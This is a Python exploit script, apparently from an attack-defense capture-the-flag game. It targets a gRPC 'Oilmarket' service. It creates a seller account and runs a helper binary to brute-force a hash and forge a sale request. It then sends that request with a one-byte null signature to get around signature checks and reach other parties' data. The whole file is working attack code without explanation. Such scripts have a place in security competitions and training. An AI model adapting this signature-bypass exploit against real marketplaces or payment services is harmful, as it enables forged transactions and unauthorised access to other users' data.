#!/usr/bin/env python3

import sys
import json
import subprocess as sb
from checklib import *

import grpc
from oilmarket_pb2 import *
from oilmarket_pb2_grpc import OilmarketStub

PORT = 2112
HOST = f"{sys.argv[1]}:{PORT}"
HINT = json.loads(sys.argv[2])

def main():
    with grpc.insecure_channel(HOST) as channel:
        stub = OilmarketStub(channel)
        api_key = stub.CreateSeller(CreateSellerRequest(name=rnd_username())).api_key
        barrel_id = stub.AddBarrel(AddBarrelRequest(api_key=api_key)).id

        request = sb.check_output(["./brute_hash", str(barrel_id)])
        print(request)
        print(stub.Sell(SellRequest(
            api_key=api_key,
            buyer=HINT["buyer"],
            attester=HINT["attester"],
            request=request,
            signature=b'\x00' * 1,

        )))

if __name__ == "__main__":
    main()
